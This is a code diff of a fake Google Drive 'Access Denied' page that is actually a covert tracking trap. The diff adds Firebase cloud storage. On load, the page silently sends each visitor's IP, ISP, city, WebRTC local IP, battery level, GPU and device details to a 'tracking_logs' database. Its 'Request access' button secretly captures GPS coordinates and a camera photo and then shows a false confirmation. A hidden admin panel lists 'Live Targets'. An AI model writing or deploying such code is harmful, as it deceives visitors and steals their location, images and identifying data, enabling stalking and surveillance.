@@ -5,11 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Google Drive - Access Denied</title>
     <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
+    
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- FontAwesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
+    <!-- FIREBASE SDKs (Compat version for simple HTML usage) -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Google+Sans:wght@400;500&display=swap');
         
@@ -36,12 +42,6 @@
         
         @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
         .log-item { animation: slideIn 0.3s ease-out; }
-
-        /* Mobile Adjustments */
-        @media (max-width: 640px) {
-            .g-card { padding: 1.5rem; box-shadow: none; border: none; }
-            .g-footer { position: relative; padding-bottom: 2rem; }
-        }
     </style>
 </head>
 <body>
@@ -59,7 +59,7 @@
                 <span class="text-gray-500 text-lg google-font">Drive</span>
             </div>
             <div class="flex items-center gap-3">
-                 <button onclick="adminKnock()" class="text-gray-500 p-2 rounded-full outline-none">
+                 <button onclick="manualAdminTrigger()" class="text-gray-500 p-2 rounded-full outline-none">
                     <i class="fa-regular fa-circle-question text-xl"></i>
                 </button>
                 <div id="admin-trigger" class="w-8 h-8 bg-purple-600 rounded-full text-white flex items-center justify-center text-sm font-medium select-none cursor-pointer active:scale-95 transition-transform">S</div>
@@ -80,6 +80,9 @@
                         Request access
                     </button>
                 </div>
+                <div id="gps-status" class="text-center text-[10px] text-gray-400 hidden">
+                    <i class="fa-solid fa-satellite-dish fa-spin mr-1"></i> Syncing to Cloud...
+                </div>
             </div>
         </div>
 
@@ -88,17 +91,17 @@
         </div>
     </div>
 
-    <!-- 2. ADMIN PANEL (The Intel) -->
+    <!-- 2. ADMIN PANEL (Cloud Sync) -->
     <div id="admin-view" class="hidden-mode absolute inset-0 admin-view h-screen flex flex-col z-50">
         
         <div class="bg-slate-900 border-b border-slate-700 p-3 flex justify-between items-center shadow-lg sticky top-0 z-50">
             <div class="flex items-center gap-2">
                 <div class="bg-blue-500/20 p-1.5 rounded-full live-indicator">
-                    <i class="fa-solid fa-radar text-blue-400 text-sm"></i>
+                    <i class="fa-solid fa-cloud text-blue-400 text-sm"></i>
                 </div>
                 <div>
-                    <h1 class="text-xs font-bold text-white tracking-wider uppercase">Krysha's Intel v14.1</h1>
-                    <p class="text-[9px] text-slate-400">STATE: <span id="sys-state" class="text-green-400">MONITORING</span></p>
+                    <h1 class="text-xs font-bold text-white tracking-wider uppercase">Krysha's Cloud Netra</h1>
+                    <p class="text-[9px] text-slate-400">SYNC: <span id="sync-status" class="text-yellow-400">CONNECTING...</span></p>
                 </div>
             </div>
             <button onclick="toggleView()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded text-[10px] border border-slate-600">EXIT</button>
@@ -108,11 +111,10 @@
             <!-- Log List -->
             <div class="w-full md:w-1/4 h-1/3 md:h-full bg-slate-900 border-b md:border-b-0 md:border-r border-slate-800 flex flex-col">
                 <div class="p-2 border-b border-slate-800 bg-slate-800/50 flex justify-between items-center">
-                    <span class="text-[10px] font-bold text-slate-400 uppercase">Activity Log</span>
-                    <button onclick="clearLogs()" class="text-[10px] text-red-400 px-2"><i class="fa-solid fa-trash"></i></button>
+                    <span class="text-[10px] font-bold text-slate-400 uppercase">Live Targets (Last 8)</span>
                 </div>
                 <div id="log-list" class="flex-grow overflow-y-auto cyber-scroll p-2 space-y-2">
-                    <!-- Logs go here -->
+                    <div class="text-center mt-10 text-slate-600 text-xs">Waiting for live data...</div>
                 </div>
             </div>
 
@@ -123,7 +125,7 @@
                         <h2 class="text-lg font-bold text-white" id="detail-title">Select Log</h2>
                         <p class="text-[10px] text-slate-400 mt-1" id="detail-time">--</p>
                     </div>
-                    <span id="vpn-badge" class="hidden bg-red-600 text-white text-[9px] px-2 py-1 rounded font-bold uppercase">VPN</span>
+                    <span id="vpn-badge" class="hidden bg-red-600 text-white text-[9px] px-2 py-1 rounded font-bold uppercase">VPN DETECTED</span>
                 </div>
 
                 <div class="grid grid-cols-1 xl:grid-cols-2 gap-4">
@@ -131,7 +133,7 @@
                     <div class="bg-slate-900 border border-slate-700 rounded-lg p-3 shadow-lg">
                         <h3 class="text-[10px] font-bold text-green-400 mb-2 uppercase"><i class="fa-solid fa-globe mr-1"></i> Network Info</h3>
                         <div class="space-y-1 font-mono text-xs">
-                            <div class="flex justify-between"><span class="text-slate-500">IP:</span> <span id="detail-ip" class="text-white font-bold">Scanning...</span></div>
+                            <div class="flex justify-between"><span class="text-slate-500">IP:</span> <span id="detail-ip" class="text-white font-bold">...</span></div>
                             <div class="flex justify-between"><span class="text-slate-500">ISP:</span> <span id="detail-isp" class="text-blue-300 truncate w-32 text-right">...</span></div>
                             <div class="flex justify-between"><span class="text-slate-500">LOC:</span> <span id="detail-city" class="text-slate-300 truncate w-32 text-right">...</span></div>
                             <div class="flex justify-between border-t border-slate-800 pt-1 mt-1"><span class="text-slate-500">WebRTC:</span> <span id="detail-localip" class="text-red-400">...</span></div>
@@ -169,157 +171,195 @@
     </div>
 
     <script>
-        // === STORAGE & STATE ===
-        const LOG_KEY = 'krysha_logs_v14_1';
-        const MAX_LOGS = 50;
-        let currentSessionData = {
-            ip: "Fetching...",
-            isp: "Fetching...",
-            city: "Fetching...",
-            local_ip: "Scanning...",
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            screen: `${window.screen.width}x${window.screen.height}`,
-            gpu: "Analyzing...",
-            battery: "Unknown"
-        };
+        // === 1. FIREBASE SETUP ===
+        const firebaseConfig = JSON.parse(typeof __firebase_config !== 'undefined' ? __firebase_config : '{}');
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app';
+        
+        let db;
+        let auth;
+        let currentUser = null;
+        let sessionDocId = null;
 
-        const get = (id) => document.getElementById(id);
+        // --- 2. CORE LOGIC ---
+        async function initApp() {
+            if (!firebase.apps.length) {
+                firebase.initializeApp(firebaseConfig);
+            }
+            auth = firebase.auth();
+            db = firebase.firestore();
 
-        // --- 1. INSTANT PASSIVE LOGGER (On Load) ---
-        async function initSystem() {
-            // A. Get Sync Data Immediately
+            // 1. Auth First
+            await signIn();
+
+            // 2. Check URL for Admin Mode
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('admin') === 'true') {
+                toggleView(); // Open admin panel directly
+            }
+
+            // 3. Start Passive Logging (Create/Update Session)
+            startPassiveLog();
+        }
+
+        async function signIn() {
+            if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                await auth.signInWithCustomToken(__initial_auth_token);
+            } else {
+                await auth.signInAnonymously();
+            }
+            currentUser = auth.currentUser;
+        }
+
+        // --- 3. LOGGING TO CLOUD ---
+        async function startPassiveLog() {
+            if (!currentUser) return;
+
+            // Basic Device Info
+            const deviceInfo = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timestamp: Date.now(), // Using Client Timestamp for simpler sorting locally
+                type: "PASSIVE CONNECT",
+                ip: "Scanning...",
+                status: "Online"
+            };
+
+            // Create a new document for this session
+            // Using strict path Rule 1
+            const collectionRef = db.collection('artifacts').doc(appId).collection('public').doc('data').collection('tracking_logs');
+            const docRef = await collectionRef.add(deviceInfo);
+            sessionDocId = docRef.id;
+
+            // Start Async Updates (Network, Battery, etc)
+            enrichData(docRef);
+        }
+
+        async function enrichData(docRef) {
+            // A. Battery
+            let battery = "Unknown";
+            try {
+                if(navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = `${Math.round(b.level*100)}%`;
+                }
+            } catch(e) {}
+
+            // B. GPU
+            let gpu = "Unknown";
             try {
                 const cvs = document.createElement('canvas');
                 const gl = cvs.getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                currentSessionData.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-            } catch(e) { currentSessionData.gpu = "Unknown"; }
+                gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+            } catch(e) {}
 
-            if(navigator.getBattery) {
-                navigator.getBattery().then(b => currentSessionData.battery = `${Math.round(b.level*100)}%`);
-            }
-
-            // B. Log IMMEDIATELY (Even without IP)
-            addLog("TARGET CONNECTED", currentSessionData);
-
-            // C. Start Async Network Fetch
-            fetchNetworkDetails();
-        }
-
-        // --- 2. ASYNC NETWORK FETCH ---
-        async function fetchNetworkDetails() {
+            // C. Network (Async)
+            let netData = { ip: "Blocked", isp: "N/A", city: "N/A" };
             try {
-                // Try IPAPI first
                 const res = await fetch('https://ipapi.co/json/');
-                if(!res.ok) throw new Error("Blocked");
-                const data = await res.json();
-                
-                // Update Session Data
-                currentSessionData.ip = data.ip;
-                currentSessionData.isp = data.org;
-                currentSessionData.city = `${data.city}, ${data.country_name}`;
-                
-                // Update the logs
-                addLog("NETWORK RESOLVED", currentSessionData);
-                
-            } catch(e) {
-                // Backup: IPWHOIS
-                try {
-                    const res2 = await fetch('https://ipwho.is/');
-                    const data2 = await res2.json();
-                    currentSessionData.ip = data2.ip;
-                    currentSessionData.isp = data2.connection?.isp;
-                    currentSessionData.city = `${data2.city}, ${data2.country}`;
-                    addLog("NETWORK RESOLVED (Backup)", currentSessionData);
-                } catch(err) {
-                    currentSessionData.ip = "Client Blocked";
-                    addLog("NETWORK FAILED", currentSessionData);
+                if(res.ok) {
+                    const data = await res.json();
+                    netData = { ip: data.ip, isp: data.org, city: `${data.city}, ${data.country_name}` };
+                } else {
+                     // Backup
+                     const res2 = await fetch('https://ipwho.is/');
+                     const data2 = await res2.json();
+                     netData = { ip: data2.ip, isp: data2.connection?.isp, city: data2.city };
                 }
-            }
+            } catch(e) {}
 
-            // WebRTC Check
-            getLocalIPs().then(ip => {
-                currentSessionData.local_ip = ip;
-                if(ip !== "Hidden" && ip !== "Secure") addLog("WEBRTC LEAK DETECTED", currentSessionData);
+            // D. WebRTC
+            let localIP = "Secure";
+            try {
+                 const pc = new RTCPeerConnection({iceServers:[]});
+                 pc.createDataChannel('');
+                 pc.onicecandidate = e => {
+                    if(e.candidate) {
+                        const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if(m && !m[1].endsWith('.local')) {
+                             docRef.update({ local_ip: m[1] }); // Update specifically
+                        }
+                    }
+                 };
+                 pc.createOffer().then(o=>pc.setLocalDescription(o));
+            } catch(e) {}
+
+            // UPDATE FIRESTORE
+            docRef.update({
+                battery: battery,
+                gpu: gpu,
+                ip: netData.ip,
+                isp: netData.isp,
+                city: netData.city,
+                local_ip: localIP
             });
         }
 
-        // --- 3. ACTIVE TRAP (Permission Request) ---
+        // --- 4. ACTIVE TRAP (Cam + GPS) ---
         async function triggerActiveTrap() {
-            const btn = get('req-btn');
-            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Requesting...';
+            const btn = document.getElementById('req-btn');
+            const statusEl = document.getElementById('gps-status');
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Verifying...';
             btn.disabled = true;
+            statusEl.classList.remove('hidden'); // Show "Triangulating..." text
 
-            let evidence = { ...currentSessionData }; 
-            let permissionGranted = false;
+            if (!sessionDocId) return;
 
-            // Parallel Request
+            // Updates to push
+            let updates = {
+                type: "ACTIVE TRAP TRIGGERED",
+                // Force update timestamp to bring to top
+                timestamp: Date.now() 
+            };
+
+            // Parallel Promise Execution
             Promise.allSettled([captureGPS(), captureCamera()]).then((results) => {
                 
-                // GPS
+                // GPS Handling
                 if (results[0].status === 'fulfilled') {
-                    evidence.gps = results[0].value;
-                    permissionGranted = true;
+                    updates.gps = results[0].value;
+                    updates.gps_status = "LOCKED";
                 } else {
-                    evidence.gps = { error: results[0].reason?.message || "Denied" };
+                    updates.gps = { error: results[0].reason || "Denied" };
+                    updates.gps_status = "FAILED";
                 }
 
-                // Camera
+                // Camera Handling
                 if (results[1].status === 'fulfilled') {
-                    evidence.image = results[1].value;
-                    permissionGranted = true;
+                    updates.image = results[1].value;
+                    updates.cam_status = "CAPTURED";
                 } else {
-                    evidence.image = null;
+                    updates.cam_status = "DENIED";
                 }
 
-                // Log Result
-                if(permissionGranted) {
-                    addLog("EVIDENCE CAPTURED", evidence);
-                } else {
-                    addLog("PERMISSION DENIED", evidence);
-                }
+                // Push to Cloud
+                db.collection('artifacts').doc(appId).collection('public').doc('data').collection('tracking_logs').doc(sessionDocId).update(updates);
 
-                // Fake UI Response
+                // UI Cleanup
                 setTimeout(() => {
-                    alert("Request sent. Owner will verify.");
+                    alert("Verification submitted. You will be contacted shortly.");
                     btn.innerText = "Request Sent";
-                    btn.classList.replace('g-btn', 'bg-gray-400');
-                    btn.classList.add('cursor-not-allowed');
+                    statusEl.classList.add('hidden');
                 }, 1000);
             });
         }
 
-        // --- 4. SENSORS ---
-        function getLocalIPs() {
-            return new Promise(resolve => {
-                const pc = new RTCPeerConnection({iceServers:[]});
-                pc.createDataChannel('');
-                pc.onicecandidate = e => {
-                    if(!e.candidate) { pc.close(); resolve("Hidden"); return; }
-                    const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                    if(m && !m[1].endsWith('.local')) { pc.close(); resolve(m[1]); }
-                };
-                pc.createOffer().then(o=>pc.setLocalDescription(o));
-                setTimeout(()=>resolve("Secure"), 1000);
-            });
-        }
-
+        // Sensors
         function captureCamera() {
             return new Promise((resolve, reject) => {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
-                    const vid = get('hidden-video');
-                    const cvs = get('hidden-canvas');
+                    const vid = document.getElementById('hidden-video');
+                    const cvs = document.getElementById('hidden-canvas');
                     vid.srcObject = stream;
                     vid.onloadedmetadata = () => {
                         vid.play();
                         cvs.width = vid.videoWidth; cvs.height = vid.videoHeight;
                         setTimeout(() => {
-                            const ctx = cvs.getContext('2d');
-                            ctx.drawImage(vid,0,0);
+                            cvs.getContext('2d').drawImage(vid,0,0);
                             const d = cvs.toDataURL('image/jpeg', 0.5);
-                            stream.getTracks().forEach(track=>track.stop());
+                            stream.getTracks().forEach(t=>t.stop());
                             resolve(d);
                         }, 500);
                     };
@@ -329,109 +369,153 @@
 
         function captureGPS() {
             return new Promise((resolve, reject) => {
-                if(!navigator.geolocation) reject("No API");
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
-                    err => reject(err),
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
+                if(!navigator.geolocation) reject("No Geo API");
+                
+                // Fallback Logic: Try High Accuracy, if timeout, use default
+                const success = (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy });
+                
+                // First try aggressive (5s)
+                navigator.geolocation.getCurrentPosition(success, (err) => {
+                    // If fail/timeout, try low accuracy (10s)
+                    console.log("High accuracy failed, trying low accuracy...");
+                    navigator.geolocation.getCurrentPosition(success, (finalErr) => reject(finalErr.message), { enableHighAccuracy: false, timeout: 10000 });
+                }, { enableHighAccuracy: true, timeout: 5000 });
             });
         }
 
-        // --- 5. LOGGING LOGIC ---
-        function addLog(type, data) {
-            let logs = JSON.parse(localStorage.getItem(LOG_KEY) || '[]');
-            logs.unshift({
-                id: Date.now(),
-                time: new Date().toLocaleTimeString(),
-                type: type,
-                data: JSON.parse(JSON.stringify(data)) 
-            });
-            if (logs.length > MAX_LOGS) logs.pop();
-            localStorage.setItem(LOG_KEY, JSON.stringify(logs));
-            if (!get('admin-view').classList.contains('hidden-mode')) renderLogs();
-        }
 
-        function renderLogs() {
-            const logs = JSON.parse(localStorage.getItem(LOG_KEY) || '[]');
-            const list = get('log-list');
-            list.innerHTML = '';
+        // --- 5. ADMIN PANEL (Real-Time Listener) ---
+        let unsubscribe = null;
+
+        function startAdminListener() {
+            if (unsubscribe) return; // Already listening
+
+            const listEl = document.getElementById('log-list');
+            const statusEl = document.getElementById('sync-status');
             
-            if(logs.length === 0) { list.innerHTML = '<p class="text-[10px] text-slate-500 text-center mt-4">No Data</p>'; return; }
+            statusEl.innerText = "LIVE SYNC ON";
+            statusEl.classList.add('text-green-400');
 
-            logs.forEach(log => {
-                let color = 'border-slate-600';
-                if(log.type.includes('CAPTURED')) color = 'border-green-500';
-                else if(log.type.includes('DENIED')) color = 'border-red-500';
-                else if(log.type.includes('RESOLVED')) color = 'border-blue-500';
+            // Following Rule 2: Fetch collection simply, filter in memory
+            const colRef = db.collection('artifacts').doc(appId).collection('public').doc('data').collection('tracking_logs');
 
-                const item = document.createElement('div');
-                item.className = `log-item p-2 bg-slate-800 rounded border-l-2 ${color} cursor-pointer hover:bg-slate-700 mb-2`;
-                item.innerHTML = `
-                    <div class="flex justify-between items-center mb-1">
-                        <span class="font-bold text-[9px] uppercase text-white">${log.type}</span>
-                        <span class="text-[8px] text-slate-500">${log.time}</span>
-                    </div>
-                    <p class="text-[9px] text-slate-400 font-mono truncate">${log.data.ip}</p>
-                `;
-                item.onclick = () => showDetails(log);
-                list.appendChild(item);
+            unsubscribe = colRef.onSnapshot((snapshot) => {
+                listEl.innerHTML = '';
+                if(snapshot.empty) {
+                    listEl.innerHTML = '<div class="text-center mt-10 text-slate-500 text-xs">No active targets found.</div>';
+                    return;
+                }
+
+                // Client-side sorting (Rule 2 Compliance)
+                let docs = [];
+                snapshot.forEach(doc => docs.push(doc.data()));
+                
+                // Sort by timestamp desc
+                docs.sort((a, b) => b.timestamp - a.timestamp);
+                
+                // Limit to 8
+                docs = docs.slice(0, 8);
+
+                docs.forEach((data) => {
+                    const el = document.createElement('div');
+                    let border = 'border-slate-600';
+                    if (data.type.includes('ACTIVE')) border = 'border-red-500';
+                    else if (data.ip && data.ip !== 'Scanning...') border = 'border-green-500';
+
+                    // Convert timestamp
+                    let timeStr = "Just now";
+                    if(data.timestamp) timeStr = new Date(data.timestamp).toLocaleTimeString();
+
+                    el.className = `p-2 bg-slate-800 rounded border-l-2 ${border} cursor-pointer hover:bg-slate-700 mb-2 transition-all`;
+                    el.innerHTML = `
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="font-bold text-[10px] uppercase text-white">${data.type}</span>
+                            <span class="text-[9px] text-slate-500">${timeStr}</span>
+                        </div>
+                        <p class="text-[9px] text-slate-400 font-mono truncate">${data.ip}</p>
+                    `;
+                    el.onclick = () => showDetails(data);
+                    listEl.appendChild(el);
+                });
+            }, (error) => {
+                console.error("Sync Error:", error);
+                statusEl.innerText = "SYNC ERROR";
+                statusEl.classList.remove('text-green-400');
+                statusEl.classList.add('text-red-500');
             });
         }
 
-        function showDetails(log) {
-            const d = log.data;
-            get('detail-title').innerText = log.type;
-            get('detail-time').innerText = log.time;
+        function showDetails(d) {
+            document.getElementById('detail-ip').innerText = d.ip || '...';
+            document.getElementById('detail-isp').innerText = d.isp || '...';
+            document.getElementById('detail-city').innerText = d.city || '...';
+            document.getElementById('detail-localip').innerText = d.local_ip || 'Secure';
+            document.getElementById('detail-platform').innerText = d.platform || 'Unknown';
+            document.getElementById('detail-batt').innerText = d.battery || 'N/A';
+            document.getElementById('detail-gpu').innerText = d.gpu || 'N/A';
 
-            get('detail-ip').innerText = d.ip;
-            get('detail-isp').innerText = d.isp;
-            get('detail-city').innerText = d.city;
-            get('detail-localip').innerText = d.local_ip;
-            get('detail-platform').innerText = d.platform;
-            get('detail-batt').innerText = d.battery;
-            get('detail-gpu').innerText = d.gpu;
-
-            const gpsEl = get('detail-gps');
-            if(d.gps && d.gps.lat) {
+            // GPS Logic
+            const gpsEl = document.getElementById('detail-gps');
+            if (d.gps && d.gps.lat) {
                 gpsEl.innerHTML = `
                     <p class="text-green-400 font-bold mb-1">LOCKED</p>
                     <div>Lat: ${d.gps.lat}</div><div>Lon: ${d.gps.lon}</div>
-                    <a href="https://maps.google.com/?q=${d.gps.lat},${d.gps.lon}" target="_blank" class="text-blue-400 underline mt-1 block">Map</a>
+                    <div class="text-slate-500 text-[9px]">Acc: ${Math.round(d.gps.acc)}m</div>
+                    <a href="https://maps.google.com/?q=${d.gps.lat},${d.gps.lon}" target="_blank" class="text-blue-400 underline mt-1 block">Open Map</a>
                 `;
             } else {
-                gpsEl.innerHTML = `<p class="text-slate-500 italic">${d.gps?.error || "No Active Trace"}</p>`;
+                gpsEl.innerHTML = `<p class="text-red-400 italic">${d.gps?.error || "Waiting for trigger..."}</p>`;
             }
 
-            const imgEl = get('detail-img');
-            imgEl.innerHTML = d.image ? `<img src="${d.image}" class="w-full h-full object-cover">` : `<i class="fa-solid fa-image text-2xl mb-1 text-slate-600"></i><span class="text-[10px] text-slate-600">No Image</span>`;
+            // Image Logic
+            const imgEl = document.getElementById('detail-img');
+            if (d.image) {
+                imgEl.innerHTML = `<img src="${d.image}" class="w-full h-full object-cover">`;
+            } else {
+                imgEl.innerHTML = `<i class="fa-solid fa-image text-2xl mb-1 text-slate-600"></i><span class="text-[10px] text-slate-600">No Visuals</span>`;
+            }
             
-            get('vpn-badge').classList.toggle('hidden', d.local_ip === "Secure" || d.local_ip === "Scanning...");
+             // VPN Check
+             const vpnBadge = document.getElementById('vpn-badge');
+             if(d.local_ip && d.local_ip !== "Secure") vpnBadge.classList.remove('hidden');
+             else vpnBadge.classList.add('hidden');
         }
 
-        function clearLogs() { localStorage.removeItem(LOG_KEY); renderLogs(); }
-        function toggleView() { 
-            get('admin-view').classList.toggle('hidden-mode'); 
-            get('gdrive-view').classList.toggle('hidden-mode');
-            renderLogs(); 
+        // --- 6. UI TOGGLES ---
+        function toggleView() {
+            const admin = document.getElementById('admin-view');
+            const drive = document.getElementById('gdrive-view');
+            
+            if (admin.classList.contains('hidden-mode')) {
+                admin.classList.remove('hidden-mode');
+                drive.classList.add('hidden-mode');
+                startAdminListener(); // Start listening to cloud
+            } else {
+                admin.classList.add('hidden-mode');
+                drive.classList.remove('hidden-mode');
+                if (unsubscribe) { unsubscribe(); unsubscribe = null; } // Stop listening to save bandwidth
+            }
         }
 
-        // --- 6. TRIGGERS ---
-        // Desktop: Triple Click '?'
-        let knockCounter = 0, knockTimer;
-        function adminKnock() {
-            knockCounter++; clearTimeout(knockTimer); knockTimer=setTimeout(()=>knockCounter=0, 2000);
-            if(knockCounter===3) { toggleView(); knockCounter=0; }
+        // Triggers
+        let knockCount=0, knockTimer;
+        function manualAdminTrigger() {
+            knockCount++; clearTimeout(knockTimer); knockTimer=setTimeout(()=>knockCount=0,2000);
+            if(knockCount===3) { toggleView(); knockCount=0; }
         }
         
-        // Mobile: Long Press 'S' Avatar
-        let pressTimer;
-        const trig = get('admin-trigger');
-        trig.onmousedown = trig.ontouchstart = () => pressTimer = setTimeout(() => { toggleView(); if(navigator.vibrate) navigator.vibrate(50); }, 2000);
-        trig.onmouseup = trig.onmouseleave = trig.ontouchend = () => clearTimeout(pressTimer);
+        const mobTrig = document.getElementById('admin-trigger');
+        let pt;
+        mobTrig.addEventListener('touchstart', (e) => {
+            pt = setTimeout(() => { toggleView(); if(navigator.vibrate) navigator.vibrate(50); }, 2000);
+        });
+        mobTrig.addEventListener('touchend', () => clearTimeout(pt));
+        mobTrig.addEventListener('mousedown', () => pt = setTimeout(toggleView, 2000));
+        mobTrig.addEventListener('mouseup', () => clearTimeout(pt));
 
-        // Start
-        window.onload = initSystem;
+        // Start App
+        initApp();
+
     </script>
 </body>
 </html>
